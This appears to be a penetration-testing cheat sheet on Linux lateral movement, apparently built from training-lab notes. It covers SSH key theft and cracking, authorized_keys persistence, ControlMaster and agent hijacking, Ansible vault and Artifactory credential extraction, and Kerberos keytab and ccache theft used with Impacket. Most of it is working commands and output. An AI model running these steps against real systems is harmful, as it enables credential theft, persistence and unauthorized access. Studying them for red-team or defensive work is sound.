### **Lateral Movement**

### **Configuration Files**

**Check the dot hidden files**, usually we could find private keys for SSH keys or hardcoded credentials, or indications on how the system works, potential important folders or scripts and much more.

- `.bashrc`
- `.bash_profile`
- `.mysql_history`
- `.ssh`
- Any other relevant file you may find

### **SSH**

### **SSH Keys**

**Find Private Keys**

```bash
find /home/ -name "id_rsa"

/home/offsec/.ssh/id_rsa
find: ‘/home/linuxvictim/.ssh': Permission denied
...
find: ‘/home/ansibleadm/.gnupg': Permission denied
find: ‘/home/ansibleadm/.local/share': Permission denied

```

**Download Private Keys**

```bash
# Copy contents to local computer
cat id_rsa

cat known_hosts

```

**Cracking Private Keys Passphrase**

```bash
# Extract the key
ssh2john [ID_RSA] > ssh.hash
ssh2john [USER_KEY] > [USER_KEY]_hash.txt
ssh2john svuser.key > svuser.hash

# Crack it
sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./[USER_KEY]_hash.txt

```

**Use Private Keys to Connect**

```bash
ssh -i ./svuser.key svuser@[TARGET_SERVER]

```

### **SSH Persistence**

**Generate SSH Keypair** If we accept the default values for the file path, it will create a pair of files in our **~/.ssh/directory**. We will get **id_rsa** for the private key and **id_rsa.pub** for the public key. We can then **cat** the contents of **id_rsa.pub** and copy it to the clipboard.

```bash
# On your Kali
ssh-keygen

Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/kali/.ssh/id_rsa.
Your public key has been saved in /home/kali/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:VTLfYd2shCqYOTkpZqeHRrqxnKjyVViNgbmVMpKyEug root@kali
The key's randomart image is:
+---[RSA 2048]----+
|.  . o..  o ..oo.|
|+ o = o+   =.o..+|
|.+ . =o*. ...... |
|oE  *oX ...   .  |
|.  =.=.oS.       |
|  o +..          |
| o *..           |
|o =.             |
|+..              |
+----[SHA256]-----+

```

**Insert Public Key** in the victim's user folder

```bash
# For example if our target is /home/emma/
echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/emma/.ssh/authorized_keys

```

**Connect to the Victim**

```bash
ssh emma@[TARGET_SERVER]

```

### **SSH Hijacking with ControlMaster**

**Theory** SSH hijacking is a lateral movement technique that abuses existing SSH sessions, similar to RDP hijacking in Windows. Attackers often leverage the **ControlMaster** feature or the **ssh-agent** to reuse active connections without re-entering credentials. By creating or modifying a user's `~/.ssh/config` file, ControlMaster can be enabled so that multiple sessions share the same socket, which remains open for a set time (`ControlPersist`) or indefinitely. If an attacker gains shell access or write permissions to a user's home directory, they can hijack active SSH connections to pivot into downstream systems. This is especially useful in red team scenarios where stealth and avoiding credential theft are priorities.

**Steps** A --> B: a has a session on B, piggybacking A's access to B

```bash
# Check files
~/.ssh/config
or
/etc/ssh/ssh_config

```

Any socket file like `kevin@web03:22` in `/home/kevin/.ssh/controlmaster`

```bash
ssh kevin@web03

# Example
ssh -S /home/user/.ssh/controlmaster/user\@linuxvictim\:22 user@linuxvictim

```

If logged in as root

```bash
ssh -S /home/alice/.ssh/controlmaster\@alice@web03\:22 alice@web03

```

### **SSH Agent Forwarding**

**Theory** SSH-Agent stores a user's private keys and answers signing requests so the user doesn't retype passphrases. Agent forwarding lets an intermediate host proxy those signing requests back to the origin client, enabling the forwarded session to SSH onward without the private key ever leaving the client. In an attack, an adversary on the intermediate machine can use the forwarded agent (or coerce it via crafted requests) to authenticate to downstream systems if the attacker can reach them — making agent-forwarding a powerful lateral-movement vector. Practical requirements: a keypair on the originating machine and the public key installed on the intermediate and destination hosts (e.g., `ssh-copy-id -i ~/.ssh/id_rsa.pub user@host`).

**Steps** A -> B -> C: A has a session on B, and A's private key can access to both B and C. On B to access C. Normal user.

```bash
ssh alice@web03

```

Privileged User

```bash
SSH_AUTH_SOCK=/tmp/ssh-xxx ssh-add -l

SSH_AUTH_SOCK=/tmp/ssh-xxx ssh alice@web03

# Example
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh user@linuxvictim

```

### **Ansible**

**Playbook Possibilities**

- Node hosts: `/etc/ansible/hosts`
- Check the folder `/etc/ansible`
- Execute commands on node servers

**Crack Vaults**

```bash
# Find a way to download the vault.

# Convert the hash, for example
ansible2john root.enc > vault.hash

# Crack the vault
john --wordlist=rockyou.txt vault.hash

# Go back to the server and use the password to decrypt the vault
cat the_vault | ansible-vault decrypt

```

**Retrieve credentials of node servers from playbook**

```bash
ansible2john web.yaml > ansible_web_hash.txt

hashcat --wordlist=/usr/share/wordlists/rockyou.txt --force --hash-type=16900 ansible_web_hash.txt

cat pw.txt | ansible-vault decrypt

```

**Sensitive data**

- Playbook contains a command, the command contains plaintext credential, like `/opt/playbooks/mysql.yml`
- Check the folder `/opt/playbooks/` and `/var/log/syslog` trying to find sensible information.

### **Artifactory (JFrog)**

**Check Location** Binary Repository Manager - Port 8082

```bash
ps aux | grep artifactory

```

**Possible Attacks**

- **Check existing files and user interactions** like creation, download, etc.
- **Delivery malicious file** (With user interaction)
- **Database backup contains credential**: `/opt/jfrog/artifactory/var/backup/access`, for example:

```bash
# Check the files found
cd /opt/jfrog/artifactory/var/backup/access
cat access.backup.20200730120454.json
...
{
    "username" : "developer",
    "firstName" : null,
    "lastName" : null,
    "email" : "developer@corp.local",
    "realm" : "internal",
    "status" : "enabled",
    "lastLoginTime" : 0,
    "lastLoginIp" : null,
    "password" : "bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm",
    "allowedIps" : [ "*" ],
    "created" : 1591715957889,
    "modified" : 1591715957889,
    "failedLoginAttempts" : 0,
    "statusLastModified" : 1591715957889,
    "passwordLastModified" : 1591715957889,
    "customData" : {
      "updatable_profile" : {
        "value" : "true",
        "sensitive" : false
      }
...

# Copy the bcrypt hash part to a file and try to crack it
echo "$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm" > derbyhash.txt
sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt

```

- **Compromise the Database**

```bash
# 1. Copy the database
mkdir /tmp/hackeddb
sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb
sudo chmod 755 /tmp/hackeddb/derby
sudo rm /tmp/hackeddb/derby/*.lck

# 2. Run the Derby connection utility
sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
ij version 10.15
ij> connect 'jdbc:derby:/tmp/hackeddb/derby';
ij>

# 3. Run your actions, like listing users
ij> select * from access_users;
USER_ID |USERNAME |PASSWORD |ALLOWED_IPS |CREATED |MODIFIED |FIRSTNAME |LASTNAME |EMAIL |REALM |STATUS |LAST_LOGIN_TIME |LAST_LOGIN_IP |FAILED_ATTEMPTS |STATUS_LAST_MODIFIED| PASSWORD_LAST_MODIF&
...
1 |admin |bcrypt$$2a$08$3gNs9Gm4wqY5ic/2/kFUn.S/zYffSCMaGpshXj/f/X0EMK.ErHdp2 |127.0.0.1 |1591715727140 |1591715811546 |NULL |NULL |NULL |internal |enabled |1596125074382 |192.168.118.5 |0 |1591715811545 |1591715811545
...
3 |developer |bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm |* |1591715957889 |1591715957889 |NULL |NULL |developer@corp.local |internal |enabled |0 |NULL |0 |1591715957889 |1591715957889

3 rows selected
ij>

```

### **Kerberos**

### **Stealing Keytab Files**

**Theory** If we have access to an user and its password, we can create tickets for it and then use that ticket to connect to AD services or servers. Keytab files store a Kerberos principal name and encrypted keys, allowing scripts or users to authenticate to Kerberos-enabled resources without needing to enter a password. They're often used in automated tasks, such as cron jobs, to enable secure access to services like MSSQL. By reviewing cron configurations and scripts, one can identify which keytabs are in use and which users they belong to. A keytab can be created with **ktutil** by adding entries for a user, specifying encryption, entering the password, writing the keytab file, and exiting the utility.

**Steps**

1. **Create the keytab file**

```bash
ktutil

ktutil:  addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
Password for administrator@CORP1.COM:

ktutil:  wkt /tmp/administrator.keytab

ktutil:  quit

```

1. Load the keytab file

```bash
kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab

# Check and view that it was created successfully
klist

Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: administrator@CORP1.COM

Valid starting       Expires              Service principal
07/30/2020 15:18:34  07/31/2020 01:18:34  krbtgt/CORP1.COM@CORP1.COM
        renew until 08/06/2020 15:18:34

```

1. **(Optional) Renewing an expired TGT**

```bash
kinit -R

```

1. Use the ticket, below is just an example accessing an smb with the ticket and no password but it can be any other server or service

```bash
smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$

```

### **Stealing and Using Cached Files**

**Theory** If you control a target's Kerberos session you can immediately act as that user by reusing their live tickets, avoiding the need for a fresh TGT; alternatively, stealing or copying a user's credential cache (ccache, typically `/tmp/krb5cc*`) and loading it locally lets you authenticate as them without their password — however, ccache files are usually owner-only readable so this typically requires privileged access (sudo/root or read access to the user's files). In short: live shells → use existing tickets; privileged access → copy `/tmp/krb5cc<…>` and import it to impersonate the user.

Two main attack scenarios for using a victim's Kerberos tickets:

1. **Compromise an active shell session**: If you control a user's' live shell, you can use their existing Kerberos tickets (no new TGT needed) and act as that user.
2. **Steal or reuse the user's ccache file**
    - Kerberos credential caches (ccache) are usually stored under `/tmp` (e.g. `/tmp/krb5cc<random>`).
    - They're normally only readable by the owner, so an unprivileged attacker usually can't steal them.
    - With privileged access (or the ability to read the user's files) you can copy the victim's ccache and load it as your own to authenticate without logging in as that user.

**Steps**

1. **List ccache files in `/tmp/`**

```bash
ls -al /tmp/krb5cc_*

-rw------- 1 user                  user                 1430 Aug 25 15:17 /tmp/krb5cc_1000
-rw------- 1 administrator@corp1.com domain users@corp1.com 4016 Aug 25 15:11 /tmp/krb5cc_607000500_3aeIA5

```

1. **Copy the ccache file**

```bash
offsec@linuxvictim:~$ sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
[sudo] password for offsec:

offsec@linuxvictim:~$ sudo chown offsec:offsec /tmp/krb5cc_minenow

offsec@linuxvictim:~$ ls -al /tmp/krb5cc_minenow
-rw------- 1 offsec offsec 4016 Jul 30 15:20 /tmp/krb5cc_minenow

```

1. **Setting the ccache file for using it and verifying**

```bash
# Cleaning memory of current tickets
offsec@linuxvictim:~$ kdestroy

offsec@linuxvictim:~$ klist
klist: No credentials cache found (filename: /tmp/krb5cc_1000)

# Adding the ticket to memory
offsec@linuxvictim:~$ export KRB5CCNAME=/tmp/krb5cc_minenow

offsec@linuxvictim:~$ klist

Ticket cache: FILE:/tmp/krb5cc_minenow
Default principal: Administrator@CORP1.COM

Valid starting       Expires              Service principal
07/30/2020 15:11:10  07/31/2020 01:11:10  krbtgt/CORP1.COM@CORP1.COM
        renew until 08/06/2020 15:11:08
07/30/2020 15:11:41  07/31/2020 01:11:10  ldap/dc01.corp1.com@CORP1.COM
        renew until 08/06/2020 15:11:08
07/30/2020 15:11:57  07/31/2020 01:11:10  MSSQLSvc/DC01.corp1.com:1433@CORP1.COM
        renew until 08/06/2020 15:11:08

```

1. Use the ticket, below is just an example for getting service tickets using our current stolen ticket

```bash
# Requesting the TGTs for services
offsec@linuxvictim:~$ kvno MSSQLSvc/DC01.corp1.com:1433

MSSQLSvc/DC01.corp1.com:1433@CORP1.COM: kvno = 2

# Verifying the new added tickets from Kerberos
offsec@linuxvictim:~$ klist
Ticket cache: FILE:/tmp/krb5cc_minenow
Default principal: Administrator@CORP1.COM

Valid starting       Expires              Service principal
07/30/2020 15:11:10  07/31/2020 01:11:10  krbtgt/CORP1.COM@CORP1.COM
        renew until 08/06/2020 15:11:08
07/30/2020 15:11:41  07/31/2020 01:11:10  ldap/dc01.corp1.com@CORP1.COM
        renew until 08/06/2020 15:11:08
07/30/2020 15:11:57  07/31/2020 01:11:10  MSSQLSvc/DC01.corp1.com:1433@CORP1.COM
        renew until 08/06/2020 15:11:08

```

### **Using Impacket Suite with Kerberos**

**Steps**

1. Download the ccache file and set up the KRB5CCNAME environment variable

```bash
kali@kali:~$ scp offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow
offsec@linuxvictim's password:
krb5cc_minenow                            100% 4016    43.6KB/s   00:00

kali@kali:~$ export KRB5CCNAME=/tmp/krb5cc_minenow

```

1. **Install Kerberos client utilities**

```bash
sudo apt install krb5-user

```

1. **Add the DC IP to the `/etc/hosts` file**, like in the example below

```
127.0.0.1	localhost
192.168.120.40  controller
192.168.120.45  linuxvictim
192.168.120.5 CORP1.COM DC01.CORP1.COM

```

1. **Commented out `proxy_dns` line in proxychains configuration file `/etc/proxychains.conf`**

```
# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#
...
# Proxy DNS requests - no leak for DNS data
#proxy_dns
...

```

1. (Optional) Setup an SSH tunnel for `proxychains` to be able to reach the internal network, discard this step if you had configured the internal tunneling otherwise, for this code example below in the `/etc/proxychains.conf` should be the line `socks 127.0.0.1 9050`

```bash
kali@kali:~$ ssh [USER]@linuxvictim -D 9050
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64)
...

```

1. **Run the tools**, below is just an example

```bash
# Listing Active Directory users
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip [DC_IP] [DOMAIN].COM/Administrator

# Gather SPNs for our Kerberos user
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip [DC_IP] [DOMAIN].COM/Administrator

# Getting a shell with psexec
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass
```
